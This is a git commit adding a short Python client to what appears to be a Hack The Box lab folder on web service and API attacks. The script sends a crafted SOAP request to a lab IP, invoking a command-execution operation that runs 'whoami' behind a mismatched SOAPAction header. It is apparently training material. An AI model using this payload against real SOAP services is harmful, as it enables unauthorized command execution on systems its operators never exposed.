da087c499f709efeac9cf03b065462bfd5b93908
Marcos Martín <85010707+r4fik1@users.noreply.github.com>
2023-05-03 22:46:04 +0200

    Add files via upload

---
+++ HTB_Web_Service_&_API_Attacks/client.py
@@ -0,0 +1,6 @@
+
+import requests
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'
+
+print(requests.post("http://10.129.192.39:3002/wsdl", data=payload, headers={"SOAPAction":'"LoginRequest"'}).content)
